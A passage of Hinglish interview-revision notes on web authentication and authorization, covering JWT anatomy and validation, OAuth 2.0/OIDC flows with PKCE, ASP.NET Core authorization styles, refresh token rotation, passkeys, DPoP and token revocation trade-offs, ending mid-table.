# Authentication & Authorization — Quick Revision Notes

> Yeh quick-revision notes hain, Guide file se derived. Guide ke har section aur sub-topic ko same order mein cover karta hai — sirf brush-up ke liye, deep-dive Guide mein hai. Style Hinglish (Hindi + English Roman script mein), technical terms English mein.

---

## 1. Core Concepts

### 1.1 Authentication vs Authorization

**Q: AuthN vs AuthZ ka farak?**
- **Authentication** = "Tum ho kaun?" → login process (credentials/token/cert). Middleware: `UseAuthentication()` → `HttpContext.User` populate karta hai. Fail → **401**.
- **Authorization** = "Tum kya kar sakte ho?" → claims/roles/policies resource ke against evaluate. Middleware: `UseAuthorization()` → `[Authorize]` requirements. Fail → **403**.

**Q: 401 aa raha hai jab 403 expect kiya tha — kyun?**
A: Authentication handler ne valid principal populate hi nahi kiya (missing/invalid/expired token), isliye pipeline authorization tak pahuncha hi nahi. 403 tabhi milega jab authN succeed ho gaya par policy/role fail ho.

### 1.2 Stateful Sessions vs Stateless Tokens

**A) Stateful sessions:** server session record store karta hai (`sessionId -> userId, roles, expiry`) memory/Redis/DB mein. Client sirf random `sessionId` cookie bhejta hai.
- Faayde: revocation easy, server hi truth control karta hai.
- Nuksan: server ko session state store + scale karna padta hai.

**B) Stateless tokens (JWT common format):** token mein khud claims hote hain, client har request mein bhejta hai, server crypto-verify karta hai — koi storage nahi.
- Faayde: horizontally scalable, koi central store nahi.
- Nuksan: revocation harder, careful security design chahiye.

```mermaid
flowchart LR
    subgraph Stateful["Stateful Session"]
    A1[Client] -- sessionId cookie --> A2[Server]
    A2 -- lookup --> A3[(Session Store)]
    end
    subgraph Stateless["Stateless JWT"]
    B1[Client] -- JWT --> B2[Server]
    B2 -- verify signature, no DB call --> B2
    end
```

Key point: JWT ek **format** hai jo stateless approach mein use hota hai — "stateless" ka synonym nahi.

### 1.3 Basic Authentication (Legacy)

`username:password` ko Base64-encode karke **har** request par bhejta hai:
```
Authorization: Basic dXNlcjpwYXNzd29yZA==
```
- **Kaise:** client Base64 encode karta hai; server har call par decode + validate.
- **Faayde:** trivial to implement, universally supported, VPN ke peeche internal system-to-system ke liye theek.
- **Risks:** creds har request par jaate hain; Base64 = **encoding, encryption nahi** (intercept karne wale ko raw password); koi expiry/revocation nahi; TLS downgrade par replay-vulnerable.

**Q: Hamesha HTTPS par kyun?** A: Creds sirf encoded hain, encrypted nahi — bina transport encryption ke transit mein trivially recover ho jaate hain (network/proxy logs). Ek captured request indefinitely replay ho sakti hai.

**Replay attack:** attacker ek valid authenticated request/token capture karke baad mein resend karta hai unauthorized access ke liye, bina underlying credentials jaane. Mitigation: TLS + short-lived creds + sensitive ops ke liye nonces.

### 1.4 What JWT Actually Is

- JWT = compact, URL-safe string jo JSON claims ka set represent karta hai.
- **Signed (common)** → authenticity + integrity → technically **JWS**.
- **Encrypted (kam common)** → confidentiality → **JWE**.

**JOSE family:**

| Spec | Meaning |
|---|---|
| JWS | Signed JWT |
| JWE | Encrypted JWT |
| JWK | Key representation format |
| JWA | Algorithm names (HS256, RS256...) |

**Critical misconception (interview mein correct karo):** *signed JWT secret nahi hota.* Koi bhi payload Base64URL-decode karke padh sakta hai. Signed JWT deta hai:
- **Integrity** — payload alter nahi ho sakta bina signature invalidate kiye.
- **Authenticity** — kisne issue kiya verify ho sakta hai.
- **Confidentiality NAHI** — uske liye JWE / sensitive data avoid / opaque tokens + introspection.

**Base64URL** (not standard Base64): `+`→`-`, `/`→`_`, padding aksar omit. URL-safe banata hai. Encoding ≠ security.

### 1.5 JWT Anatomy — Header, Payload, Signature

Signed JWT: `xxxxx.yyyyy.zzzzz` — 3 Base64URL segments dots se separated.

**Header:**
```json
{ "alg": "RS256", "typ": "JWT", "kid": "key-2026-05" }
```
- `alg`: signing/encryption algorithm. `typ`: usually "JWT". `kid`: kaun sa public key (JWKS se) use karna hai.

**Payload (claims):**
```json
{ "iss": "...", "aud": "my-api", "sub": "user_123",
  "exp": 1760000000, "iat": 1759996400, "nbf": 1759996400,
  "scope": "orders:read orders:write", "role": "admin" }
```

**Signature:** `base64url(header) + "." + base64url(payload)` par `alg` se compute. Verify hone par pata chalta hai header+payload exactly issuer ne jo sign kiya wahi hai.

### 1.6 Claims: Registered, Public, Private

**Registered (standard):**

| Claim | Meaning |
|---|---|
| `iss` | Issuer |
| `sub` | Subject (user id) |
| `aud` | Audience (aapka API) |
| `exp` | Expiry (UNIX ts) |
| `iat` | Issued at |
| `nbf` | Not-before |
| `jti` | Unique token id (revocation lists ke liye) |

- **Public claims:** globally unique/collision-resistant names (aksar URIs).
- **Private claims:** apne app fields — `employeeId`, `tenantId`, `Department`.

---

## 2. Intermediate

### 2.1 Signing Algorithms: HS256 vs RS256 vs ES256

- **HS256 (HMAC, symmetric):** same secret sign + verify. Jise verify karna hai usko secret chahiye — leak hua to wo valid tokens **mint** kar sakta hai. Achha: single authority, tightly controlled services. Risky: bahut services (secret sprawl).
- **RS256 (RSA, asymmetric):** private sign, public verify. APIs ko sirf public key. Achha: microservices, third-party, JWKS publish.
- **ES256 (ECDSA, asymmetric):** RS256 jaisa split par smaller keys/tokens, faster verify. Thoda operational friction (library/HSM support).

**Rule of thumb:** ek se zyada service verify kare → RS256/ES256. HS256 sirf jab har verifier control mein ho + secret protect ho.

| | HS256 | RS256 | ES256 |
|---|---|---|---|
| Key | Symmetric | Asymmetric | Asymmetric |
| Verify karne wala | secret holder (forge bhi kar sakta) | public key holder (forge nahi) | public key holder (forge nahi) |
| Best for | monolith | microservices | multi-service, size/perf sensitive |
| Key distribution risk | High | Low | Low |

### 2.2 Where JWTs Live in HTTP & Storage Trade-offs

Common: `Authorization: Bearer <token>`. Alt: HttpOnly Secure cookie (browser apps).

| Storage | JS-readable? | XSS risk | CSRF risk | Notes |
|---|---|---|---|---|
| `localStorage` | Haan | High | Nahi | Easiest, worst security |
| `sessionStorage` | Haan | High | Nahi | Tab close par clear, still XSS-vuln |
| HttpOnly cookie | Nahi | Low | Haan | Browser apps ka best default |

Universal "perfect" answer nahi — app type + threat model. SPA+API ke liye kaafi teams HttpOnly cookie + CSRF protection ya BFF pattern (3.9) prefer karti hain.

### 2.3 Access Tokens vs Refresh Tokens

| Aspect | Access Token | Refresh Token |
|---|---|---|
| Purpose | APIs access | Naya access token lena |
| Lifetime | Short (5–30 min) | Long (days/weeks) |
| Stored | memory / short cookie | secure (HttpOnly cookie, encrypted DB) |
| API ko sent | Haan, har request | Nahi — sirf token/auth endpoint ko |
| Revocable | Hard (stateless) | Easy (server-side record) |
| Steal risk | Limited (short window) | High jab tak rotation+reuse detection na ho |
| Format | JWT | Usually **opaque** random string |

**Refresh tokens opaque kyun (JWT nahi):** easy server-side revocation + rotation tracking chahiye — opaque = ek lookup key ek DB/Redis record mein jo fully control mein hai, koi self-contained stale claims nahi.

### 2.4 Full Login → API → Refresh Flow

```mermaid
sequenceDiagram
    participant C as Client
    participant AS as Auth Server
    participant API as Resource API
    C->>AS: POST /login (credentials)
    AS-->>C: Access Token (JWT) + Refresh Token (opaque)
    C->>API: GET /orders (Bearer access token)
    API->>API: Validate signature, iss, aud, exp
    API-->>C: 200 OK
    Note over C,API: access token expires
    C->>AS: POST /refresh (refresh token)
    AS->>AS: Validate + rotate
    AS-->>C: New Access + New Refresh (old invalidated)
```

**Rotation:** har refresh par naya refresh token, purana invalid → theft *detect* karne mein madad (3.8).

### 2.5 JWT Validation — Internally Kya Hota Hai

Correct verifier "signature + expiry" se **kaafi zyada** karta hai (highest-value answer):
1. **Parse** header+payload — kisi field par trust nahi abhi.
2. **Key safely select:** RS256/ES256 ke liye `kid` se **trusted, pre-configured** JWKS se pick karo. Token jis URL par point kare usse keys **kabhi** fetch mat karo (`jku`/`x5u` injection attack).
3. **Signature verify** us algorithm se jo *server-side configure* kiya — token ke claimed alg se nahi (4.3).
4. **Standard claims validate:** `exp` future (thoda clock skew 1–2 min), `nbf` ≤ now, `iss` = expected, `aud` mein aapke API ka identifier.
5. **Authorize:** scopes/roles/permissions resource ke against check.
6. **Optional hardening:** `jti` revocation list check; `tenantId` match; `typ`/`token_use` check (refresh token ko access ke roop mein replay na ho).

**Key idea (zor se kaho):** *signature prove karta hai issuer ne banaya; claims validation prove karta hai yeh mere liye aur abhi valid hai.* Dono zaroori. Validate ke baad claims `HttpContext.User` (`ClaimsPrincipal`) mein materialize.

### 2.6 Claims vs Roles vs Policy-Based Authorization

- **Role:** simple grouping — `Admin`, `User`.
- **Claim:** key-value — `Department=Finance`.
- **Policy:** named, centrally-registered rule (claims + roles + custom logic se banti).

| Feature | Role-based | Claims-based | Policy-based |
|---|---|---|---|
| Flexibility | Low | High | Highest |
| Granularity | Coarse | Fine | Fine + composable |
| Scalability | Limited (role explosion) | High | High, centralized |
| Logic kahan | scattered attributes | scattered + manual checks | centralized in `AddAuthorization()` |

```csharp
// Role-based
[Authorize(Roles = "Admin")]
// Claims-based (inline)
if (!User.HasClaim("Department", "IT")) return Forbid();
// Policy-based (centralized, reusable, testable)
builder.Services.AddAuthorization(o =>
    o.AddPolicy("ITOnly", p => p.RequireClaim("Department", "IT")));
[Authorize(Policy = "ITOnly")]
public IActionResult InternalData() => Ok();
```

**Kyun claims/policies scale karte hain:** roles coarse, requirements specific hone par combinatorially multiply (`FinanceRegionAdmin`...). Claims attributes independently express karke policies mein combine karte hain. Policies decision logic centralize karti hain (auditability).

**Policy pitfalls:** overly complex nested policies test/debug hard (fail par sirf 403 with less detail) → custom `IAuthorizationHandler` jo log kare *kyun* fail hui; policies chhoti + composable rakho.

### 2.7 The 7 ASP.NET Core Authorization Styles

1. **Simple** — `[Authorize]` bina param; sirf authenticated user.
2. **Role-based** — `[Authorize(Roles="Admin,Manager")]`; `ClaimTypes.Role`.
3. **Policy-based** — named policies register + `[Authorize(Policy="...")]`; recommended default.
4. **Claims-based** — policy mein `RequireClaim(...)` ya `User.HasClaim(...)`; roles se finer.
5. **Custom requirement-based** — `IAuthorizationRequirement` + `AuthorizationHandler<T>` un rules ke liye jo declaratively express nahi hote (e.g. "sirf apne banaye orders edit").
6. **Endpoint-specific** — Minimal APIs mein `.RequireAuthorization("Policy")` route par; same engine, alag syntax.
7. **Resource-based** — `IAuthorizationService.AuthorizeAsync(User, resource, policy)` jab decision *specific object* par depend kare (pehle object load karke ownership check). Runtime data par depend karta hai, sirf token par nahi.

```csharp
public class DocumentAuthHandler : AuthorizationHandler<SameAuthorRequirement, Document>
{
    protected override Task HandleRequirementAsync(
        AuthorizationHandlerContext ctx, SameAuthorRequirement req, Document resource)
    {
        if (resource.OwnerId == ctx.User.FindFirstValue(ClaimTypes.NameIdentifier))
            ctx.Succeed(req);
        return Task.CompletedTask;
    }
}
// Usage:
var result = await _authorizationService.AuthorizeAsync(User, document, "SameAuthorPolicy");
if (!result.Succeeded) return Forbid();
```

---

## 3. Advanced

### 3.1 OAuth 2.0 — Roles, Flows, Grant Types

OAuth 2.0 = **authorization framework** — user apna data third-party app ko de sakta hai *bina credentials share kiye*. Khud authentication protocol nahi (wo OIDC layer karta hai, 3.4).

**Four roles:** Resource Owner (user), Client (app), Authorization Server (authenticate + tokens issue), Resource Server (protected API).

**Authorization Code flow ("Login with Google"):**
1. User "Login with Google" click.
2. App → Google authorization endpoint redirect.
3. User authenticate + permission grant.
4. Google → **authorization code** ke saath back redirect.
5. App code ko tokens ke liye exchange (server-to-server; confidential = client secret, public = PKCE verifier).
6. App **access token** se API call.

```
GET https://accounts.google.com/o/oauth2/auth
    ?client_id=...&redirect_uri=https://yourapp.com/callback
    &response_type=code&scope=email profile
```
```
POST https://oauth2.googleapis.com/token
client_id=...&client_secret=...&code=AUTH_CODE
&grant_type=authorization_code&redirect_uri=https://yourapp.com/callback
```
```json
{ "access_token": "ya29...", "expires_in": 3600,
  "token_type": "Bearer", "refresh_token": "1//0g..." }
```

### 3.2 OAuth2 Grant Types: Deprecated/Unsafe

| Grant type | Status | Use case | Why/why not |
|---|---|---|---|
| Auth Code (+PKCE) | **Standard** | Web/SPA/mobile, user present | URL/history mein token expose nahi; PKCE public clients ko bhi protect |
| Client Credentials | **Standard** | M2M, no user | Client apne secret/cert se auth; no user context |
| Refresh Token | **Standard** | Silently naya access token | Hamesha rotate (3.8) |
| Device Code | **Standard** | TVs, CLIs | User doosri device par short code se auth |
| **Implicit** | **Deprecated** | Tha: pre-PKCE SPAs | Token seedha URL fragment mein, no code exchange, no client auth, history/referrer leak, no refresh. OAuth 2.1 removes. |
| **ROPC (Password)** | **Deprecated** | Tha: trusted first-party | App raw creds handle karta hai — OAuth ka purpose defeat; no MFA/federation. OAuth 2.1 removes. |

**Q: Implicit dead hai to modern SPAs tokens kaise?** A: Auth Code + PKCE — PKCE client secret hata deta hai par secure code-exchange rakhta hai.

### 3.3 PKCE — Ab Confidential Clients Ke Liye Bhi Mandatory Kyun

**PKCE (RFC 7636)** originally public clients ke liye — authorization code ko us client se bind karta hai jisne request kiya:
1. Client random `code_verifier` generate, `code_challenge = BASE64URL(SHA256(verifier))` derive.
2. Auth request mein `code_challenge` + `code_challenge_method=S256`.
3. AS challenge store karta hai code ke saath.
4. Token exchange mein original `code_verifier`.
5. Server hash recompute + compare — mismatch = reject.

**Defeats authorization code interception:** attacker code intercept bhi kar le (malicious app same URI scheme, compromised network), verifier ke bina exchange nahi kar sakta.

**Ab confidential clients ke liye bhi kyun (OAuth 2.1, Azure AD, Okta):**
- **Defense in depth:** confidential client ka code bhi redirect par intercept ho sakta hai (history, referrer, logs).
- **Guidance simplify:** "hamesha PKCE" > conditional rule → kam misconfig.
- **Cheap:** no operational cost, client secret/cert auth ke saath cleanly compose (dono checks apply).

```mermaid
sequenceDiagram
    participant App as SPA (public client)
    participant AS as Authorization Server
    participant API as Resource API
    App->>App: Generate code_verifier, derive code_challenge (S256)
    App->>AS: Authorization request + code_challenge
    AS->>App: Redirect with authorization code
    App->>AS: Token request: code + code_verifier
    AS->>AS: Recompute SHA256(verifier), compare
    AS-->>App: Access + ID Token (+ Refresh if offline_access)
    App->>API: Bearer <access_token>
```

### 3.4 OAuth 2.0 vs OpenID Connect vs JWT

- **JWT** = token **format**.
- **OAuth 2.0** = **authorization framework** (client tokens kaise paata/use karta hai).
- **OIDC** = OAuth ke upar **identity layer** — standardized **ID Token** (hamesha JWT), `/userinfo`, login semantics.

| | OAuth 2.0 | JWT |
|---|---|---|
| Purpose | Authorization protocol | Token format |
| Usage | Access delegate | Claims authenticate/represent |
| User data self-contained? | Nahi | Haan |
| Validate ke liye call? | opaque = introspection | Nahi — local crypto |
| Best for | delegated access, SSO | stateless auth payload |

**OIDC ke 3 tokens:**

| Token | Purpose | Format |
|---|---|---|
| ID Token | *Client* ko batata hai user kaun hai | Hamesha JWT |
| Access Token | *Resource API* calls authorize | JWT ya opaque |
| Refresh Token | Naye tokens bina re-login | Usually opaque |

**Common mistake (proactively bolo):** API call karne ke liye **ID token** use karna. ID token *client* ke liye hai. APIs ko **access token** validate karna chahiye jiska `aud` us API ke liye scoped ho.

### 3.5 SAML vs OIDC for SSO/Federation

| | SAML 2.0 | OIDC |
|---|---|---|
| Token format | XML (signed assertions) | JWT (JSON) |
| Transport | redirects/POST, heavy XML | compact URL-safe tokens |
| Era/use | Enterprise SSO, legacy IdP (ADFS), B2B | Modern web/mobile/SPA, API-first |
| Mobile/SPA | Poor | Good (PKCE etc.) |
| Logout | SAML SLO (fragile) | RP-Initiated (simpler, kuch edge cases) |
| Dev ergonomics | Verbose, XML-sig edge cases | JSON, JWKS key rotation |

**Q: Naye project mein SAML introduce karoge?** A: Nahi, choice se nahi — sirf tab jab existing enterprise IdP/partner mandate kare. New projects → OIDC default. Bridge karna ho to **identity broker** (Azure AD/Okta/Auth0/Keycloak) upstream SAML accept karke downstream OIDC present karta hai (common pattern).

### 3.6 Azure AD (Entra ID) + Angular MSAL

**Flow:** Authorization Code + PKCE.
```
Angular App → Azure AD Login → (Code + PKCE) → Azure AD issues Access/ID Token
→ Angular calls .NET API with Bearer Token
```
**Setup:**
1. **App register** (Entra ID → App registrations). Redirect URI (`http://localhost:4200`), platform = SPA. Save Client ID + Tenant ID.
2. **API permissions** — Graph `User.Read`, admin consent.
3. **(Optional) Backend API expose** — App ID URI (`api://<CLIENT_ID>`), scope (`access_as_user`).
4. **Install:** `npm install @azure/msal-browser @azure/msal-angular`.
5. **Configure MSAL** — `clientId`/`tenantId`/`redirectUri`, cache `sessionStorage`, protected resource map (Graph + backend). MSAL auto login redirect, token acquire, header attach, silent refresh.
6. **Protect routes:** `MsalGuard`.
7. **Login/logout:** `loginRedirect()`/`logoutRedirect()`.
8. **API call:** `HttpClient` normally — MSAL interceptor token attach karta hai.
9. **.NET API secure:** Microsoft.Identity.Web, `appsettings.json` mein `Instance`/`TenantId`/`ClientId`/`Audience`. Auto validate via OIDC metadata/JWKS.

**Pitfalls:** wrong redirect URI, missing admin consent, over-broad scopes, CORS misconfig, deprecated implicit flow, token audience mismatch.
**Best practices:** Auth Code + PKCE; MSAL ko cache manage karne do (manually store mat karo); HTTPS only; least-privilege scopes; conditional access; sign-in logs monitor.

### 3.7 Okta PKCE + Refresh Token + .NET API

**Angular (`@okta/okta-angular`, `@okta/okta-auth-js`):**
```typescript
const oktaAuth = new OktaAuth({
  issuer: 'https://YOUR_OKTA_DOMAIN/oauth2/default',
  clientId: 'YOUR_CLIENT_ID',
  redirectUri: window.location.origin + '/login/callback',
  scopes: ['openid', 'profile', 'email']
});
```
- `signInWithRedirect()`/`signOut()`; `getAccessToken()`; `HttpInterceptor` auto Bearer attach.

```mermaid
flowchart TD
    A[Login click] --> B[Angular generates code_verifier]
    B --> C[Creates code_challenge]
    C --> D[Redirect to Okta]
    D --> E[User authenticates]
    E --> F[Okta returns Auth Code]
    F --> G[Angular sends code + code_verifier]
    G --> H[Okta issues Access, ID, Refresh Token]
    H --> I[Access token for API]
    I --> J[Access token expires]
    J --> K[Refresh token silently gets new access token]
```

**.NET API — standard JWT bearer at Okta Authority:**
```csharp
builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(o =>
    {
        o.Authority = "https://dev-12345.okta.com/oauth2/default";
        o.Audience = "api://default";
    });
builder.Services.AddAuthorization();
```
`Authority` set → middleware OIDC discovery/JWKS auto fetch + cache; keys rotate hone par transparently rotate. Public key kabhi hard-code nahi.

**Key concepts:** PKCE (code interception prevent), `offline_access` scope (refresh token ke liye zaroori), `autoRenew` (expiry se pehle auto refresh).

### 3.8 Refresh Token Rotation & Reuse Detection

- **Rotation:** har use par naya refresh token, purana immediately invalid → stolen token ki usefulness window narrow. Par akela theft *detect* nahi karta.
- **Reuse detection (rotation ko real control banata hai):**
  1. Har refresh token use ke baad **"consumed"** mark (delete nahi).
  2. Consumed token phir present hua = theft signal (legitimate client ke paas hamesha latest hi hoga). Ya (a) rare race condition (short grace window), ya (b) attacker replay.
  3. Reuse par **poori token family/chain revoke** (sirf ek nahi) → full re-auth force.

```mermaid
sequenceDiagram
    participant U as Legitimate User
    participant A as Attacker (stole RT1)
    participant S as Auth Server
    U->>S: Refresh with RT1
    S->>S: Mark RT1 consumed, issue RT2
    S-->>U: New Access + RT2
    A->>S: Refresh with RT1 (stolen, consumed)
    S->>S: Detect reuse
    S->>S: Revoke entire family (RT1, RT2...)
    S-->>A: 401 Unauthorized
```

**Trade-off:** family revoke → legitimate user bhi logout ho sakta hai — intentional "fail safe". Sirf reused token revoke karne se attacker ka rotated descendant valid rehta hai (point defeat).
**Bonus:** refresh tokens ko device/session metadata (IP range, UA fingerprint) se bind karna — secondary signal, bar raise karta hai + richer audit.

### 3.9 SPA-to-API Auth: BFF Pattern vs Token-in-Browser

- **Token-in-browser:** SPA (ya supporting backend) end mein token browser ki reach mein — HttpOnly cookie mein bhi, browser hi jagah hai jahan token consume hota hai.
- **BFF (Backend-for-Frontend):** browser kabhi OAuth token dekhta hi nahi.

```mermaid
flowchart LR
    Browser["Browser (SPA)"] -- "Session cookie only (HttpOnly, Secure, SameSite)" --> BFF["BFF (backend)"]
    BFF -- "OAuth Auth Code + PKCE (server-to-server)" --> AS["Authorization Server"]
    BFF -- "Access token attached server-side" --> API["Resource API"]
```
- SPA sirf apne backend se plain session cookie — koi JWT/OAuth token JS tak nahi.
- BFF confidential client hai, OAuth dance khud karta hai, downstream API par token attach.
- "Browser mein token safely kahan" problem eliminate — answer: "kahin nahi."

| | Token-in-browser | BFF |
|---|---|---|
| XSS blast radius | session ride ya localStorage se token steal | session ride par bhi portable bearer token nahi milta |
| Complexity | Lower | Higher (extra backend) |
| Mobile/Postman | Natural (bearer) | Alag flow (native apps ko BFF usually nahi chahiye) |
| Token exposure | browser trust boundary ka part | browser kabhi token trust boundary mein nahi |
| Recommended by | — | OAuth 2.0 Security BCP (browser apps) |

**Framing:** dual-cookie/header approach pragmatic + ship-worthy hai, wrong nahi — par senior answer recognize kare ki wo real bearer token browser origin mein daalta hai, aur BFF ko defense-in-depth alternative naam se mention kare (jab SPA + backend dono control mein).

### 3.10 ASP.NET Core Identity Customization

Zyada real .NET systems Identity ko replace nahi, uske upar layer karte hain. Common points:
- **Custom `IdentityUser`:** `public class AppUser : IdentityUser<Guid> { TenantId, DisplayName, IsActive }` + matching `IdentityDbContext<AppUser, AppRole, Guid>`.
- **Custom validators:** `IPasswordValidator<TUser>`/`IUserValidator<TUser>` org policy ke liye.
- **Custom claims principal factory:** `UserClaimsPrincipalFactory<TUser>` override — sign-in par extra claims (tenant, feature flags) inject, per-request query ki jagah.
- **Token provider replace:** Identity default cookie-based; API ke liye JWT chahiye to Identity sirf user/credential mgmt (`SignInManager`, `UserManager`) + apne JWTs custom endpoint se issue.
- **`AddIdentityCore` vs `AddIdentity`:** API-only ke liye `AddIdentityCore` — cookie-auth/UI scaffolding skip; user/role/password mgmt + upar JWT bearer.
- **Custom stores:** `IUserStore<TUser>` implement (EF bypass) jab users external system (legacy DB, Azure AD) mein — rare, real senior scenario.

```csharp
builder.Services.AddIdentityCore<AppUser>(o =>
    {
        o.Password.RequiredLength = 12;
        o.User.RequireUniqueEmail = true;
    })
    .AddRoles<AppRole>()
    .AddEntityFrameworkStores<AppDbContext>()
    .AddDefaultTokenProviders();

builder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)
    .AddJwtBearer(/* ... */);
```

**Q: API ke liye Identity ka built-in cookie auth kyun nahi?** A: Cookie auth browser/session-oriented — non-browser clients (mobile, service-to-service) ko serve nahi karta, na statelessly scale karta hai jaise signed JWT. Identity user/credential/role *management* ke liye rakho; JWT actual API authentication handle kare.

### 3.11 Multi-Tenant Authentication & Authorization

Key design questions:
1. **Tenant identity kahan?** Token claim (`tenantId`) — simplest, par tenant change par re-issue (ya version-check). Ya request se derived (subdomain/header/route) + user ke allowed tenants ke against cross-check (per-request lookup).
2. **Single vs multiple IdP per tenant:** shared IdP + tenant claim (B2C SaaS). Ya per-tenant IdP (har enterprise apna Azure AD/Okta) → **dynamic issuer validation** (`ValidIssuers` ya custom `IssuerValidator`).
3. **Cross-tenant leakage = #1 bug class:** har query tenant se scoped; JWT claim par akela rely dangerous — data-access layer par bhi enforce (EF Core global query filters).
4. **Token audience/issuer per tenant:** app-per-tenant model mein `aud`/`iss` tenant-aware.

```csharp
options.TokenValidationParameters = new TokenValidationParameters
{
    ValidateIssuer = true,
    IssuerValidator = (issuer, token, parameters) =>
        _tenantIssuerResolver.IsKnownIssuer(issuer) ? issuer
            : throw new SecurityTokenInvalidIssuerException("Unknown tenant issuer"),
    ValidateAudience = true,
};
```

**Framing:** hard part token validation nahi — tenant scoping har layer par consistently enforce karna (claim → middleware → data access). Ek missed filter = cross-tenant leak.

### 3.12 WebAuthn / FIDO2 / Passkeys

2025/26 mein "emerging" se "default recommendation" — Apple/Google/Microsoft + enterprise IdPs (Entra, Okta).

**Core idea — koi shared secret steal karne layak nahi:** password/OTP shared secrets hain; WebAuthn **asymmetric key pairs** per device, per site:
- Registration par authenticator (Windows Hello/Touch ID, ya hardware key) **naya public/private pair us origin ke liye scoped** generate.
- **Private key authenticator se kabhi bahar nahi** (secure enclave/TPM, non-exportable).
- **Public key server par store** — account + `credentialId` se linked.
- Har pair single origin se bound → cross-site kuch reusable nahi.

**Phishing-resistant kyun (password/OTP nahi hain):**
- Password/OTP koi bhi page maang le (phishing clone including); user `example.com` vs `examp1e.com` reliably nahi bata sakta.
- WebAuthn credential **cryptographically origin-bound** by browser/OS — browser actual origin signed data mein include karta hai; phishing site valid signed assertion produce nahi kar sakti. User kabhi secret dekhta/type karta hi nahi.
- OTP-MFA se differentiator: OTP abhi bhi user par site identify karne ke liye rely — real-time phishing proxies (AiTM) OTP-MFA defeat karte hain; WebAuthn wo human trust step hata deta hai.

**Ceremonies:**
1. **Registration (attestation):** server challenge + RP info + user info → browser `navigator.credentials.create()` → authenticator naya pair, challenge sign, public key + `credentialId` + attestation return → server verify + **public key store**.
2. **Authentication (assertion):** server naya challenge (optionally scoped to registered credentialIds) → `navigator.credentials.get()` → local gesture (biometric/PIN/tap) → **private key se challenge sign** → server stored public key se verify.

```mermaid
sequenceDiagram
    participant U as User
    participant B as Browser/Authenticator
    participant S as Server (Relying Party)
    B->>S: Request login challenge
    S-->>B: Challenge + allowed credentialId(s)
    B->>U: Prompt local gesture
    U->>B: Approve (local only)
    B->>B: Sign challenge with device-bound private key
    B->>S: Signed assertion + credentialId
    S->>S: Verify signature against stored public key
    S-->>B: Authenticated (issue session/JWT)
```

**ASP.NET Core fit:**
- Recent .NET releases native passkey/WebAuthn support add kar rahe hain (current version ke against verify karo — evolving).
- Independent option: **`Fido2NetLib`** library (server-side ceremonies), browser-side `navigator.credentials` JS/TS.
- Shape hamesha: server = **Relying Party**, public keys + credential IDs store (passwords nahi), ceremony succeed par normal session/JWT issue. WebAuthn *credential-verification* replace karta hai, downstream token issuance nahi.

**Q: MFA replace karta hai?** A: Passkeys inherently multi-factor describe hote hain — something you have (device, crypto-bound) + something you are/know (biometric/PIN local unlock). Kaafi orgs passkey login ko MFA-satisfying treat karte hain, par policy varies — security-posture decision hai, technical requirement nahi; current version/org policy verify karo.

### 3.13 DPoP (RFC 9449 — Demonstrating Proof of Possession)

Newer OAuth extension — bearer token ki best-known weakness address karta hai; full mTLS ka lighter-weight alternative.

**Problem: bearer tokens = bearer instruments.** Jo bhi hold kare use kar sakta hai — server legitimate client vs thief (XSS/log/proxy/extension leak) distinguish nahi kar sakta. Kisi bhi IP/device/client se replay ho sakta. Isliye revocation + short expiry itne important (detection/response, prevention nahi).

**DPoP token ko specific client se bind karta hai:**
1. Client apna **public/private pair** locally generate (browser `CryptoKey` non-extractable — server ko kabhi nahi).
2. **Har** request (token + API calls) ke liye ek **DPoP proof** = small short-lived JWT (method, URL, timestamp, `jti`) private key se signed.
3. Access token request par proof include → AS public key ka **hash** access token mein embed (`cnf.jkt` — JWK thumbprint claim).
4. Har API call par: **access token** + **fresh DPoP proof** — `Authorization: DPoP <token>` + `DPoP` header.
5. Resource server 2 cheezein verify: (a) proof signature valid + method/URL/recency match, (b) proof ki public-key hash = token ka `cnf.jkt`. Dono par hi accept.

Stolen token akela useless — private key (client se kabhi nahi gaya) ke bina valid proof nahi banta.

| | Plain Bearer | DPoP-Bound |
|---|---|---|
| Per request | Sirf token | Token + freshly signed DPoP proof |
| Replay ke liye chahiye | Sirf token | Token + client private key (untransmitted) |
| Server check | Token sig/iss/aud/exp | + proof signature + key-hash match |
| Infra | Standard issuance | Client key gen/storage + per-req signing + server replay cache (jti) |
| Protects from | Kuch nahi beyond expiry | Bearer token theft/replay from different client |

```csharp
// DPoP proof JWT shape (client-side, signed with client private key)
// Header: { "typ":"dpop+jwt", "alg":"ES256", "jwk": { /* public key */ } }
// Payload: { "jti":"unique-per-request", "htm":"GET",
//            "htu":"https://api.example.com/orders", "iat":1730000000 }
// Server verifies proof sig against embedded jwk, then SHA256(jwk) == token cnf.jkt
```

**DPoP vs mTLS — DPoP lighter kyun:**
- **mTLS (4.5):** token/connection ko full X.509 cert se bind (TLS handshake). Strong, par cert issuance/distribution/rotation + service mesh/gateway chahiye. Transport-layer PoP.
- **DPoP:** similar *application-layer* goal, ordinary JWTs + public-key crypto (client khud generate) — no CA, no cert lifecycle, no TLS/infra change. SPAs/mobile public clients ke liye practical.
- **Trade-off:** DPoP *token* protect karta hai, *transport connection* nahi; per-request overhead + server ko `jti` replay cache chahiye. mTLS → service-to-service (cert infra hai); DPoP → browser/mobile/public (token theft primary threat).

**Q: Short-lived tokens hain to DPoP kyun?** A: Short expiry exposure *window* limit karta hai par window ke *andar* replay nahi rokta — stolen 5-min token 5 min ke liye kahin se usable. DPoP complementary — stolen token ko private key ke bina worthless banata hai.

---

## 4. Security & Performance

### 4.1 JWT Revocation Kyun Hard — aur Real Strategies

JWT self-contained + (default) server state check nahi → issue hone ke baad `exp` tak valid (logout/deactivate/steal par bhi).
- **A) Very short access lifetime (5–15 min):** most common, usually sufficient. Refresh token revoke + short window expire hone do.
- **B) Revocation list/blacklist by `jti`:** revoked IDs store jab tak expire na ho; har request check. State + lookup reintroduce → statelessness partially defeat. Sirf high-value (immediate termination).
- **C) Token versioning ("session version"):** DB mein `userTokenVersion`, JWT mein `ver` claim, mismatch = reject. Per-request DB/Redis check.
- **D) Opaque tokens + introspection:** random string, API auth server ko call karke validate. Fully revocable, par per-request network hop (4.2).

**One-liner:** short expiry / refresh revocation / `jti` blacklist / key rotation — free lunch nahi; har option statelessness ka kuch trade karta hai.

### 4.2 Opaque Tokens vs JWT for Revocation — Real Trade-off

| | JWT (self-contained) | Opaque + introspection |
|---|---|---|
| Revocation | Hard (blacklist/versioning) | Trivial (record delete/flag) |
| Per-request cost | Zero network (pure crypto) | Network call per validation (unless cached) |
